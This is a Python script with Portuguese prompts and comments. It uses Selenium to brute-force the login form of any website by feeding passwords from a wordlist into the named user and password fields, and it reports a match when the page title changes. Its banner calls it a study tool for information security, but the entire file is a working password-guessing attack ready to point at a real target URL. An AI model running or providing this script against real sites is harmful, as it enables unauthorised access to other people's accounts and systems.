
#Author Wellington R. alves
#Script brute force para todos os sites
from sys import argv
try:
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
except:
    print("Instale a biblioteca selenium, Comando pip install selenium")
def banner():
    print("""
    ____________ _    _ 
| ___ \  ___| |  | |
| |_/ / |_  | |  | |
| ___ \  _| | |/\| |
| |_/ / |   \  /\  /
\____/\_|    \/  \/ 

    Brute force by wellington
    Author: wellington R. alves
    
    Script feito para estudo na seguraça da informação                                    
    """)


def interagir():
    chrome = input("Chrome Drive path: ")
    usuario = input("usuario: ")
    wordlist = input("Wordlist: ")
    alvo = input("url: ")
    name_user = input("form user: ")
    name_pass = input("form pass: ")
    titulo = input("title: ")
    brute(chrome, usuario, wordlist, alvo, name_user, name_pass, titulo)

def brute(chrome, usuario, wordlist, alvo, name_user, name_pass, titulo):
    driver = webdriver.Chrome(chrome)
    f = open(wordlist, "r")
    while True:
        for senhas in f:
            driver.get(alvo)
            campo_user = driver.find_element_by_name(name_user)
            campo_pass= driver.find_element_by_name(name_pass)

            campo_user.send_keys(usuario.rstrip())
            campo_pass.send_keys(senhas.rstrip())
            campo_pass.send_keys(Keys.ENTER)
            print("Testando senha: {}".format(senhas.rstrip()))
            if(driver.title != titulo):
                print("Senha encontrada: {}".format(senhas.rstrip()))
                break
        break

banner()
try:
    requisição = argv[1]

    if( requisição == "-i"):
        interagir()
except:
    print("-i para iniciar o script")
